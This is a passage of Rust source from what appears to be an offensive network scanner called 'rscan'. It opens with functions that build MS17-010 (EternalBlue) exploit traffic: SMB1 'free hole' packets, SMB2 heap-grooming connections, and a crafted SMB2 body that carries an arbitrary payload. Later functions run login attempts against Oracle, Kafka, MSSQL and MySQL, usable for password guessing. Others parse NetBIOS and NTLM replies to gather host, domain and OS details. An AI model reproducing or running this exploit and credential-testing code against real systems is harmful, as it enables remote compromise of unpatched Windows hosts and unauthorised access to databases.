    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x31]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x2B);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&tree_id);
    packet.extend_from_slice(&[0xFF, 0xFE]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0x40, 0x00]);
    packet.extend_from_slice(&[0x01, 0x01, 0x00, 0x0C, 0x00]);
    packet.extend_from_slice(b"AAAAAAAAAAA\0");
    packet
}

fn smb1_free_hole(target: &OpenService, timeout: Duration, start: bool) -> Result<TcpStream> {
    let mut stream = connect_stream(target, timeout)?;
    write_and_flush(&mut stream, &ms17010_negotiate_request())?;
    let _ = read_ms17010_response(&mut stream, "free hole negotiate")?;

    write_and_flush(&mut stream, &smb1_free_hole_session_packet(start))?;
    let _ = read_smb1_packet(&mut stream, "free hole session")?;
    Ok(stream)
}

fn smb1_free_hole_session_packet(start: bool) -> Vec<u8> {
    let (flags2, vc_num, native_os) = if start {
        (
            [0x07, 0xC0],
            [0x2D, 0x01],
            vec![0xF0, 0xFF, 0x00, 0x00, 0x00],
        )
    } else {
        (
            [0x07, 0x40],
            [0x2C, 0x01],
            vec![0xF8, 0x87, 0x00, 0x00, 0x00],
        )
    };

    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x51]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x73);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18]);
    packet.extend_from_slice(&flags2);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x00, 0x40, 0x00]);
    packet.push(0x0C);
    packet.extend_from_slice(&[0xFF, 0x00, 0x00, 0x00, 0x04, 0x11, 0x0A, 0x00]);
    packet.extend_from_slice(&vc_num);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x80]);
    packet.extend_from_slice(&[0x16, 0x00]);
    packet.extend_from_slice(&native_os);
    packet.extend(std::iter::repeat_n(0u8, 17));
    packet
}

fn smb2_grooms(target: &OpenService, timeout: Duration, count: usize) -> Result<Vec<TcpStream>> {
    let mut streams = Vec::with_capacity(count);
    for _ in 0..count {
        let mut stream = connect_stream(target, timeout)?;
        write_and_flush(&mut stream, MS17010_SMB2_GROOM_HEADER)?;
        streams.push(stream);
    }
    Ok(streams)
}

fn smb2_body(payload: &[u8]) -> Vec<u8> {
    let packet_max_payload = MS17010_PACKET_MAX_LEN - MS17010_PACKET_SETUP_LEN;
    let mut body = Vec::new();
    body.extend(std::iter::repeat_n(0u8, 0x08));
    body.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]);
    body.extend(std::iter::repeat_n(0u8, 0x1C));
    body.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]);
    body.extend(std::iter::repeat_n(0u8, 0x74));
    body.extend_from_slice(&[0xB0, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.extend_from_slice(&[0xB0, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x10));
    body.extend_from_slice(&[0xC0, 0xF0, 0xDF, 0xFF]);
    body.extend_from_slice(&[0xC0, 0xF0, 0xDF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0xC4));
    body.extend_from_slice(&[0x90, 0xF1, 0xDF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x04));
    body.extend_from_slice(&[0xF0, 0xF1, 0xDF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x40));
    body.extend_from_slice(&[0xF0, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.extend(std::iter::repeat_n(0u8, 0x08));
    body.extend_from_slice(&[0x00, 0x02, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    body.push(0x00);
    body.extend_from_slice(payload);
    body.extend(std::iter::repeat_n(
        0u8,
        packet_max_payload.saturating_sub(payload.len()),
    ));
    body
}

fn oracle_login(
    target: &OpenService,
    username: &str,
    password: &str,
    service_name: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .context("failed to build oracle runtime")?;

    runtime.block_on(async {
        let config = OracleConfig::new(&target.host, target.port, service_name, username, password)
            .connect_timeout(timeout);
        match tokio::time::timeout(timeout, OracleConnection::connect_with_config(config)).await {
            Ok(Ok(connection)) => {
                let _ = tokio::time::timeout(timeout, connection.close()).await;
                Ok(true)
            }
            Ok(Err(_)) | Err(_) => Ok(false),
        }
    })
}

fn read_ms17010_response(stream: &mut TcpStream, stage: &str) -> Result<Vec<u8>> {
    let mut response = vec![0u8; 4096];
    let size = stream
        .read(&mut response)
        .with_context(|| format!("failed to read {stage} response"))?;
    if size < 36 {
        anyhow::bail!("{stage} response too short");
    }
    response.truncate(size);
    Ok(response)
}

fn read_smb1_packet(stream: &mut TcpStream, stage: &str) -> Result<Vec<u8>> {
    let mut netbios = [0u8; 4];
    stream
        .read_exact(&mut netbios)
        .with_context(|| format!("failed to read {stage} netbios header"))?;
    if netbios[0] != 0x00 {
        anyhow::bail!("invalid {stage} netbios message type: 0x{:02x}", netbios[0]);
    }
    let length =
        ((netbios[1] as usize) << 16) | ((netbios[2] as usize) << 8) | (netbios[3] as usize);
    let mut body = vec![0u8; length];
    stream
        .read_exact(&mut body)
        .with_context(|| format!("failed to read {stage} smb body"))?;
    let mut packet = Vec::with_capacity(4 + body.len());
    packet.extend_from_slice(&netbios);
    packet.extend_from_slice(&body);
    Ok(packet)
}

fn smb_status_code(response: &[u8]) -> Result<u32> {
    let bytes: [u8; 4] = response
        .get(9..13)
        .context("missing smb status code")?
        .try_into()
        .context("invalid smb status code length")?;
    Ok(u32::from_le_bytes(bytes))
}

fn smb_user_id(response: &[u8]) -> Result<[u8; 2]> {
    response
        .get(32..34)
        .context("missing smb user id")?
        .try_into()
        .context("invalid smb user id length")
}

fn smb_tree_id(response: &[u8]) -> Result<[u8; 2]> {
    response
        .get(28..30)
        .context("missing smb tree id")?
        .try_into()
        .context("invalid smb tree id length")
}

fn parse_ms17010_os(response: &[u8]) -> String {
    let Some(session) = response.get(36..) else {
        return String::new();
    };
    if session.first().copied().unwrap_or_default() == 0 || session.len() < 10 {
        return String::new();
    }
    let byte_count = u16::from_le_bytes([session[7], session[8]]) as usize;
    if response.len() != byte_count + 45 {
        return String::new();
    }
    let end = session[10..]
        .windows(2)
        .position(|window| window == [0, 0])
        .map(|index| index + 10)
        .unwrap_or(session.len());
    let bytes = session[10..end]
        .iter()
        .copied()
        .filter(|byte| *byte != 0)
        .collect::<Vec<_>>();
    String::from_utf8_lossy(&bytes).trim().to_string()
}

fn ms17010_negotiate_request() -> Vec<u8> {
    hex::decode(MS17010_NEGOTIATE_REQUEST_HEX).expect("valid MS17010 negotiate request")
}

fn ms17010_session_setup_request() -> Vec<u8> {
    hex::decode(MS17010_SESSION_SETUP_REQUEST_HEX).expect("valid MS17010 session setup request")
}

fn ms17010_tree_connect_request(host: &str, user_id: [u8; 2]) -> Vec<u8> {
    let ipc_path = format!(r"\\{}\IPC$", host);
    let byte_count = 1 + ipc_path.len() + 1 + 6;
    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x75);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x2F, 0x4B]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0xC5, 0x5E]);
    packet.extend_from_slice(&[0x04, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00]);
    packet.extend_from_slice(&(byte_count as u16).to_le_bytes());
    packet.push(0x00);
    packet.extend_from_slice(ipc_path.as_bytes());
    packet.push(0x00);
    packet.extend_from_slice(b"?????\0");
    let length = (packet.len() - 4) as u32;
    packet[1..4].copy_from_slice(&length.to_be_bytes()[1..4]);
    packet
}

fn ms17010_trans_named_pipe_request() -> Vec<u8> {
    hex::decode(MS17010_TRANS_NAMED_PIPE_REQUEST_HEX)
        .expect("valid MS17010 trans named pipe request")
}

fn ms17010_trans2_session_setup_request() -> Vec<u8> {
    hex::decode(MS17010_TRANS2_SESSION_SETUP_REQUEST_HEX)
        .expect("valid MS17010 trans2 session setup request")
}

fn parse_findnet_payload(payload: &[u8]) -> Option<FindnetProbeResult> {
    let marker = payload
        .windows(FINDNET_END_MARKER.len())
        .position(|window| window == FINDNET_END_MARKER)?;
    let relevant = &payload[..marker.saturating_sub(4)];
    let encoded = hex::encode(relevant);

    let hostname_hex = encoded
        .as_bytes()
        .chunks(4)
        .take_while(|chunk| *chunk != b"0000")
        .flat_map(|chunk| chunk.iter().copied())
        .collect::<Vec<_>>();
    let hostname = decode_utf16le_hex(std::str::from_utf8(&hostname_hex).ok()?)
        .filter(|value| is_valid_findnet_hostname(value))
        .unwrap_or_default();

    let mut ipv4 = Vec::new();
    let mut ipv6 = Vec::new();
    let mut seen = BTreeSet::new();
    for segment in encoded.replace("0700", "").split("000000") {
        if segment.is_empty() {
            continue;
        }
        let normalized = if segment.len() % 2 == 0 {
            segment.to_string()
        } else {
            format!("{segment}0")
        };
        let bytes = match hex::decode(&normalized) {
            Ok(bytes) => bytes,
            Err(_) => continue,
        };
        let candidate = clean_findnet_address(&bytes);
        if candidate.is_empty() || !seen.insert(candidate.clone()) {
            continue;
        }
        if candidate.contains(':') {
            ipv6.push(candidate);
        } else if candidate.parse::<std::net::Ipv4Addr>().is_ok() {
            ipv4.push(candidate);
        }
    }

    if hostname.is_empty() && ipv4.is_empty() && ipv6.is_empty() {
        None
    } else {
        Some((hostname, ipv4, ipv6))
    }
}

fn decode_utf16le_hex(value: &str) -> Option<String> {
    let mut padded = value.to_string();
    while !padded.len().is_multiple_of(4) {
        padded.push('0');
    }
    let mut output = String::new();
    for chunk in padded.as_bytes().chunks(4) {
        let text = std::str::from_utf8(chunk).ok()?;
        let swapped = format!("{}{}", &text[2..4], &text[0..2]);
        let code = u16::from_str_radix(&swapped, 16).ok()?;
        if let Some(ch) = char::from_u32(code as u32).filter(|ch| !ch.is_control()) {
            output.push(ch);
        }
    }
    Some(output)
}

fn is_valid_findnet_hostname(value: &str) -> bool {
    if value.is_empty() || value.len() > 255 {
        return false;
    }
    let bytes = value.as_bytes();
    bytes
        .first()
        .is_some_and(|byte| byte.is_ascii_alphanumeric())
        && bytes
            .last()
            .is_some_and(|byte| byte.is_ascii_alphanumeric())
        && bytes
            .iter()
            .all(|byte| byte.is_ascii_alphanumeric() || *byte == b'-')
}

fn clean_findnet_address(value: &[u8]) -> String {
    let candidate = String::from_utf8_lossy(value)
        .chars()
        .filter(|ch| !ch.is_control())
        .collect::<String>()
        .trim()
        .to_string();
    if candidate.parse::<std::net::IpAddr>().is_ok() || is_valid_findnet_hostname(&candidate) {
        candidate
    } else {
        String::new()
    }
}

fn parse_netbios_udp_response(input: &[u8]) -> Option<NetBiosInfo> {
    if input.len() < 57 {
        return None;
    }
    let count = *input.get(56)? as usize;
    let data = &input[57..];
    let mut info = NetBiosInfo::default();

    for index in 0..count {
        let start = 18 * index;
        let entry = data.get(start..start + 18)?;
        let name = String::from_utf8_lossy(&entry[..15]).trim().to_string();
        let suffix = entry[15];
        let group = entry[16] >= 128;
        match (suffix, group) {
            (0x00, true) if info.domain_name.is_empty() => {
                info.domain_name = name.clone();
                info.group_name = name;
            }
            (0x00, false) if info.workstation_service.is_empty() => {
                info.workstation_service = name;
            }
            (0x20, _) if info.server_service.is_empty() => {
                info.server_service = name;
            }
            (0x1c, _) if info.domain_controllers.is_empty() => {
                info.domain_controllers = name;
            }
            (0x1b, _) if info.domain_name.is_empty() => {
                info.domain_name = name;
            }
            _ => {}
        }
    }

    if info == NetBiosInfo::default() {
        None
    } else {
        Some(info)
    }
}

fn netbios_session_request(name: &str) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(b"\x81\x00\x00D ");
    payload.extend_from_slice(&netbios_encode_name(name));
    payload.extend_from_slice(NETBIOS_SESSION_REQUEST_SUFFIX);
    payload
}

fn netbios_encode_name(name: &str) -> Vec<u8> {
    format!("{name:<16}")
        .bytes()
        .flat_map(|byte| [((byte >> 4) & 0x0f) + b'A', (byte & 0x0f) + b'A'])
        .collect()
}

fn parse_netbios_ntlm_response(input: &[u8]) -> Option<NetBiosInfo> {
    if input.len() < 48 {
        return None;
    }

    let target_info_length = u16::from_le_bytes([*input.get(43)?, *input.get(44)?]) as usize;
    if input.len() < 47 + target_info_length {
        return None;
    }
    let os_bytes = &input[47 + target_info_length..];
    let os_text = String::from_utf8_lossy(
        &os_bytes
            .iter()
            .copied()
            .filter(|byte| *byte != 0)
            .collect::<Vec<_>>(),
    )
    .trim_end_matches('|')
    .to_string();

    let start = input.windows(7).position(|window| window == b"NTLMSSP")?;
    if input.len() < start + 45 {
        return None;
    }
    let length = u16::from_le_bytes([input[start + 40], input[start + 41]]) as usize;
    let offset = input[start + 44] as usize;
    if input.len() < start + offset + length {
        return None;
    }

    let mut info = NetBiosInfo {
        os_version: os_text,
        ..NetBiosInfo::default()
    };
    let mut index = start + offset;
    let end = start + offset + length;
    while index + 4 <= end && index + 4 <= input.len() {
        let item_type = &input[index..index + 2];
        let item_len = u16::from_le_bytes([input[index + 2], input[index + 3]]) as usize;
        index += 4;
        if item_type == b"\x00\x00" || index + item_len > input.len() {
            break;
        }
        let content = String::from_utf8_lossy(
            &input[index..index + item_len]
                .iter()
                .copied()
                .filter(|byte| *byte != 0)
                .collect::<Vec<_>>(),
        )
        .to_string();
        match item_type {
            b"\x01\x00" => info.netbios_computer = content,
            b"\x02\x00" => info.netbios_domain = content,
            b"\x03\x00" => info.computer_name = content,
            b"\x04\x00" => info.domain_name = content,
            _ => {}
        }
        index += item_len;
    }

    if info == NetBiosInfo::default() {
        None
    } else {
        Some(info)
    }
}

fn join_netbios(base: &mut NetBiosInfo, extra: &NetBiosInfo) {
    if !extra.computer_name.is_empty() {
        base.computer_name = extra.computer_name.clone();
    }
    if !extra.netbios_domain.is_empty() {
        base.netbios_domain = extra.netbios_domain.clone();
    }
    if !extra.netbios_computer.is_empty() {
        base.netbios_computer = extra.netbios_computer.clone();
    }
    if !extra.domain_name.is_empty() {
        base.domain_name = extra.domain_name.clone();
    }
    if !extra.os_version.is_empty() {
        base.os_version = extra.os_version.clone();
    }
}

fn kafka_login(
    target: &OpenService,
    username: Option<&str>,
    password: Option<&str>,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    if let (Some(username), Some(password)) = (username, password) {
        write_and_flush(&mut stream, &kafka_sasl_handshake_request(1, "PLAIN"))?;
        let handshake = match kafka_read_frame(&mut stream) {
            Ok(frame) => frame,
            Err(_) => return Ok(false),
        };
        if kafka_response_correlation(&handshake) != Some(1)
            || kafka_sasl_handshake_error(&handshake).unwrap_or(i16::MAX) != 0
        {
            return Ok(false);
        }

        write_and_flush(
            &mut stream,
            &kafka_sasl_plain_auth_frame(username, password),
        )?;
        write_and_flush(&mut stream, &kafka_api_versions_request(2))?;
        let response = match kafka_read_frame(&mut stream) {
            Ok(frame) => frame,
            Err(_) => return Ok(false),
        };
        Ok(kafka_response_correlation(&response) == Some(2))
    } else {
        write_and_flush(&mut stream, &kafka_api_versions_request(1))?;
        let response = match kafka_read_frame(&mut stream) {
            Ok(frame) => frame,
            Err(_) => return Ok(false),
        };
        Ok(kafka_response_correlation(&response) == Some(1))
    }
}

fn mssql_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    mssql_write_packet(&mut stream, 0x12, 1, &mssql_prelogin_message())?;
    let _ = mssql_read_message(&mut stream)?;

    mssql_write_packet(
        &mut stream,
        0x10,
        1,
        &mssql_login7_message(&target.host, username, password),
    )?;
    let response = mssql_read_message(&mut stream)?;
    Ok(mssql_login_succeeded(&response))
}

fn mysql_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    let handshake = mysql_read_packet(&mut stream)?;
    let scramble = mysql_extract_scramble(&handshake)?;
    let response = mysql_handshake_response(username, password, &scramble);
    mysql_write_packet(&mut stream, 1, &response)?;

    let reply = mysql_read_packet(&mut stream)?;
    Ok(reply.first().copied() == Some(0x00))
}

fn mssql_prelogin_message() -> Vec<u8> {
    const VERSION: u8 = 0x00;
    const ENCRYPTION: u8 = 0x01;
    const THREAD_ID: u8 = 0x03;
    const MARS: u8 = 0x04;
    const TERMINATOR: u8 = 0xFF;

    let fields = [
        (VERSION, 6u16),
        (ENCRYPTION, 1u16),
        (THREAD_ID, 4u16),
        (MARS, 1u16),
    ];
    let mut payload = Vec::with_capacity(64);
    let mut offset = (fields.len() * 5 + 1) as u16;
    for (token, length) in fields {
        payload.push(token);
        payload.extend_from_slice(&offset.to_be_bytes());
        payload.extend_from_slice(&length.to_be_bytes());
        offset += length;
    }
    payload.push(TERMINATOR);
    payload.extend_from_slice(&0u32.to_be_bytes());
    payload.extend_from_slice(&0u16.to_be_bytes());
    payload.push(0x00);
    payload.extend_from_slice(&0u32.to_be_bytes());
    payload.push(0x00);
    payload
}

fn mssql_login7_message(server_name: &str, username: &str, password: &str) -> Vec<u8> {
    const LOGIN7_HEADER_SIZE: usize = 94;

    let hostname = "rscan";
    let app_name = "rscan";
    let library_name = "rscan";

    let hostname_utf16 = utf16le_bytes(hostname);
    let username_utf16 = utf16le_bytes(username);
    let password_utf16 = mssql_obfuscate_password(password);
    let app_name_utf16 = utf16le_bytes(app_name);
    let server_name_utf16 = utf16le_bytes(server_name);
    let library_name_utf16 = utf16le_bytes(library_name);

    let hostname_len = (hostname_utf16.len() / 2) as u16;
    let username_len = (username_utf16.len() / 2) as u16;
    let password_len = (password_utf16.len() / 2) as u16;
    let app_name_len = (app_name_utf16.len() / 2) as u16;
    let server_name_len = (server_name_utf16.len() / 2) as u16;
    let library_name_len = (library_name_utf16.len() / 2) as u16;

    let mut variable = Vec::with_capacity(256);
    let mut offset = LOGIN7_HEADER_SIZE as u16;

    let hostname_offset = offset;
    variable.extend_from_slice(&hostname_utf16);
    offset += hostname_utf16.len() as u16;

    let username_offset = offset;
    variable.extend_from_slice(&username_utf16);
    offset += username_utf16.len() as u16;

    let password_offset = offset;
    variable.extend_from_slice(&password_utf16);
    offset += password_utf16.len() as u16;

    let app_name_offset = offset;
    variable.extend_from_slice(&app_name_utf16);
    offset += app_name_utf16.len() as u16;

    let server_name_offset = offset;
    variable.extend_from_slice(&server_name_utf16);
    offset += server_name_utf16.len() as u16;

    let unused_offset = offset;

    let library_name_offset = offset;
    variable.extend_from_slice(&library_name_utf16);
    offset += library_name_utf16.len() as u16;

    let language_offset = offset;
    let database_offset = offset;
    let sspi_offset = offset;
    let attach_db_offset = offset;
    let new_password_offset = offset;

    let total_length = LOGIN7_HEADER_SIZE + variable.len();
    let mut payload = Vec::with_capacity(total_length);
    payload.extend_from_slice(&(total_length as u32).to_le_bytes());
    payload.extend_from_slice(&0x74000004u32.to_le_bytes());
    payload.extend_from_slice(&4096u32.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.push(0x60);
    payload.push(0x03);
    payload.push(0x00);
    payload.push(0x08);
    payload.extend_from_slice(&0i32.to_le_bytes());
    payload.extend_from_slice(&0x0409u32.to_le_bytes());
    payload.extend_from_slice(&hostname_offset.to_le_bytes());
    payload.extend_from_slice(&hostname_len.to_le_bytes());
    payload.extend_from_slice(&username_offset.to_le_bytes());
    payload.extend_from_slice(&username_len.to_le_bytes());
    payload.extend_from_slice(&password_offset.to_le_bytes());
    payload.extend_from_slice(&password_len.to_le_bytes());
    payload.extend_from_slice(&app_name_offset.to_le_bytes());
    payload.extend_from_slice(&app_name_len.to_le_bytes());
    payload.extend_from_slice(&server_name_offset.to_le_bytes());
    payload.extend_from_slice(&server_name_len.to_le_bytes());
    payload.extend_from_slice(&unused_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&library_name_offset.to_le_bytes());
    payload.extend_from_slice(&library_name_len.to_le_bytes());
    payload.extend_from_slice(&language_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&database_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&[0u8; 6]);
    payload.extend_from_slice(&sspi_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&attach_db_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&new_password_offset.to_le_bytes());
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&0u32.to_le_bytes());
    payload.extend_from_slice(&variable);
    payload
}

fn mssql_obfuscate_password(password: &str) -> Vec<u8> {
    let mut encoded = Vec::with_capacity(password.len() * 2);
    for code_unit in password.encode_utf16() {
        let low = (code_unit & 0xFF) as u8;
        let high = (code_unit >> 8) as u8;
        encoded.push(low.rotate_right(4) ^ 0xA5);
        encoded.push(high.rotate_right(4) ^ 0xA5);
    }
    encoded
}

fn mssql_write_packet(
    stream: &mut TcpStream,
    packet_type: u8,
    packet_id: u8,
    payload: &[u8],
) -> Result<()> {
    let length = (payload.len() + 8) as u16;
    let mut packet = Vec::with_capacity(payload.len() + 8);
    packet.push(packet_type);
    packet.push(0x01);
    packet.extend_from_slice(&length.to_be_bytes());
    packet.extend_from_slice(&[0x00, 0x00, packet_id, 0x00]);
    packet.extend_from_slice(payload);
    write_and_flush(stream, &packet)
}

fn mssql_read_message(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut message = Vec::new();
    loop {
        let mut header = [0u8; 8];
        stream
            .read_exact(&mut header)
            .context("failed to read mssql packet header")?;
        let length = u16::from_be_bytes([header[2], header[3]]) as usize;
        if length < 8 {
            anyhow::bail!("invalid mssql packet length");
        }
        let mut payload = vec![0u8; length - 8];
        stream
            .read_exact(&mut payload)
            .context("failed to read mssql packet payload")?;
        message.extend_from_slice(&payload);
        if header[1] & 0x01 != 0 {
            break;
        }
    }
    Ok(message)
}

fn mssql_login_succeeded(payload: &[u8]) -> bool {
    let mut index = 0usize;
    let mut login_ack = false;
    while index < payload.len() {
        match payload[index] {
            0xAD => {
                if let Some(length) = payload
                    .get(index + 1..index + 3)
                    .map(|value| u16::from_le_bytes([value[0], value[1]]) as usize)
                {
                    index += 3 + length;
                    login_ack = true;
                } else {
                    break;
                }
            }
            0xAA => return false,
            0xAB | 0xE3 => {
                if let Some(length) = payload
                    .get(index + 1..index + 3)
                    .map(|value| u16::from_le_bytes([value[0], value[1]]) as usize)
                {
                    index += 3 + length;
                } else {
                    break;
                }
            }
            0xFD..=0xFF => {
                if payload.len().saturating_sub(index) < 13 {
                    break;
                }
                index += 13;
            }
            _ => break,
        }
    }
    login_ack
}

fn utf16le_bytes(value: &str) -> Vec<u8> {
    value
        .encode_utf16()
        .flat_map(|unit| unit.to_le_bytes())
        .collect()
}

fn mysql_handshake_response(username: &str, password: &str, scramble: &[u8]) -> Vec<u8> {
    const CLIENT_LONG_PASSWORD: u32 = 0x0000_0001;
    const CLIENT_LONG_FLAG: u32 = 0x0000_0004;
    const CLIENT_PROTOCOL_41: u32 = 0x0000_0200;
    const CLIENT_TRANSACTIONS: u32 = 0x0000_2000;
    const CLIENT_SECURE_CONNECTION: u32 = 0x0000_8000;
    const CLIENT_PLUGIN_AUTH: u32 = 0x0008_0000;

    let capabilities = CLIENT_LONG_PASSWORD
        | CLIENT_LONG_FLAG
        | CLIENT_PROTOCOL_41
        | CLIENT_TRANSACTIONS
        | CLIENT_SECURE_CONNECTION
        | CLIENT_PLUGIN_AUTH;

    let auth_response = mysql_native_password(password, scramble);

    let mut payload = Vec::new();
    payload.extend_from_slice(&capabilities.to_le_bytes());
    payload.extend_from_slice(&0x0100_0000u32.to_le_bytes());
    payload.push(0x21);
    payload.extend_from_slice(&[0u8; 23]);
    payload.extend_from_slice(username.as_bytes());
    payload.push(0x00);
    payload.push(auth_response.len() as u8);
    payload.extend_from_slice(&auth_response);
    payload.extend_from_slice(b"mysql_native_password\0");
    payload
}

fn mysql_native_password(password: &str, scramble: &[u8]) -> Vec<u8> {
    if password.is_empty() {
        return Vec::new();
    }

    let stage1 = Sha1::digest(password.as_bytes());
    let stage2 = Sha1::digest(stage1);
    let mut combined = Vec::with_capacity(scramble.len() + stage2.len());
    combined.extend_from_slice(scramble);
    combined.extend_from_slice(&stage2);
    let stage3 = Sha1::digest(&combined);
    stage1
        .iter()
        .zip(stage3.iter())
        .map(|(left, right)| left ^ right)
        .collect()
}

fn mysql_extract_scramble(handshake: &[u8]) -> Result<Vec<u8>> {
    if handshake.len() < 34 {
        anyhow::bail!("mysql handshake too short");
    }

    let first_nul = handshake
        .iter()
        .position(|byte| *byte == 0x00)
        .context("invalid mysql handshake version")?;
    let mut index = first_nul + 1 + 4;
    let mut scramble = handshake
        .get(index..index + 8)
        .context("missing mysql scramble part one")?
        .to_vec();
    index += 8 + 1;
    index += 2 + 1 + 2 + 2;
    let auth_plugin_len = *handshake
        .get(index)
        .context("missing mysql auth plugin length")? as usize;
    index += 1 + 10;
    let second_len = auth_plugin_len.saturating_sub(8).max(13);
    let second = handshake
        .get(index..index + second_len)
        .context("missing mysql scramble part two")?;
    scramble.extend_from_slice(second);
    if let Some(position) = scramble.iter().position(|byte| *byte == 0x00) {
        scramble.truncate(position);
    }
    Ok(scramble)
}

fn mysql_read_packet(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut header = [0u8; 4];
    stream
        .read_exact(&mut header)
        .context("failed to read mysql packet header")?;
    let length = (header[0] as usize) | ((header[1] as usize) << 8) | ((header[2] as usize) << 16);
    let mut payload = vec![0u8; length];
    stream
        .read_exact(&mut payload)
        .context("failed to read mysql packet payload")?;
    Ok(payload)
}

fn mysql_write_packet(stream: &mut TcpStream, sequence: u8, payload: &[u8]) -> Result<()> {
    let length = payload.len();
    let mut packet = Vec::with_capacity(length + 4);
    packet.push((length & 0xff) as u8);
    packet.push(((length >> 8) & 0xff) as u8);
    packet.push(((length >> 16) & 0xff) as u8);
    packet.push(sequence);
    packet.extend_from_slice(payload);
    write_and_flush(stream, &packet)
}

fn kafka_api_versions_request(correlation_id: i32) -> Vec<u8> {
    kafka_request(18, 0, correlation_id, "rscan", &[])
}

fn kafka_sasl_handshake_request(correlation_id: i32, mechanism: &str) -> Vec<u8> {
    kafka_request(17, 1, correlation_id, "rscan", &kafka_string(mechanism))
}

fn kafka_sasl_plain_auth_frame(username: &str, password: &str) -> Vec<u8> {
    let payload = format!("\u{0}{username}\u{0}{password}").into_bytes();
    let mut frame = Vec::with_capacity(payload.len() + 4);
    frame.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    frame.extend_from_slice(&payload);
    frame
}

fn kafka_request(
    api_key: i16,
    api_version: i16,
    correlation_id: i32,
    client_id: &str,
    body: &[u8],
) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&api_key.to_be_bytes());
    payload.extend_from_slice(&api_version.to_be_bytes());
    payload.extend_from_slice(&correlation_id.to_be_bytes());
    payload.extend_from_slice(&kafka_string(client_id));
    payload.extend_from_slice(body);

    let mut frame = Vec::with_capacity(payload.len() + 4);
    frame.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    frame.extend_from_slice(&payload);
    frame
}

fn kafka_string(value: &str) -> Vec<u8> {
    let bytes = value.as_bytes();
    let mut encoded = Vec::with_capacity(bytes.len() + 2);
    encoded.extend_from_slice(&(bytes.len() as i16).to_be_bytes());
    encoded.extend_from_slice(bytes);
    encoded
}

fn kafka_read_frame(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut header = [0u8; 4];
    stream
        .read_exact(&mut header)
        .context("failed to read kafka frame header")?;
    let length = u32::from_be_bytes(header) as usize;
    let mut payload = vec![0u8; length];
    stream
        .read_exact(&mut payload)
        .context("failed to read kafka frame payload")?;
    Ok(payload)
}

fn kafka_response_correlation(payload: &[u8]) -> Option<i32> {
    let bytes: [u8; 4] = payload.get(0..4)?.try_into().ok()?;
    Some(i32::from_be_bytes(bytes))
}

fn kafka_sasl_handshake_error(payload: &[u8]) -> Option<i16> {
    let bytes: [u8; 2] = payload.get(4..6)?.try_into().ok()?;
    Some(i16::from_be_bytes(bytes))
}

fn parse_ber_length(bytes: &[u8]) -> Option<(usize, usize)> {
